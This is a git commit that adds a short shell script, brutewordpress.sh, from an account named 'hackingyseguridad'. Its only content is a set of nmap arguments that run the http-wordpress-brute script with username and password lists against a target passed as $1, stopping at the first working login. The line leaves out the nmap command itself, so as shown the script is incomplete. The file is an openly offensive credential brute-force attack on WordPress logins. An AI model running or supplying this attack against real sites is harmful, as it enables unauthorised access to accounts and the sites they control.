c5693c66d5272281e9f3940d9200f65139e8245c
hackingyseguridad <antonio_taboada@hotmail.es>
2022-07-11 13:09:39 +0200

    Create brutewordpress.sh

---
+++ brutewordpress.sh
@@ -0,0 +1,5 @@
+
+
+
+--script=http-wordpress-brute  --script-args 'userdb=ususarios.txt,passdb=claves.txt,http-wordpress-brute.hostname=domain.com,
+http-wordpress-brute.threads=3,brute.firstonly=true' $1
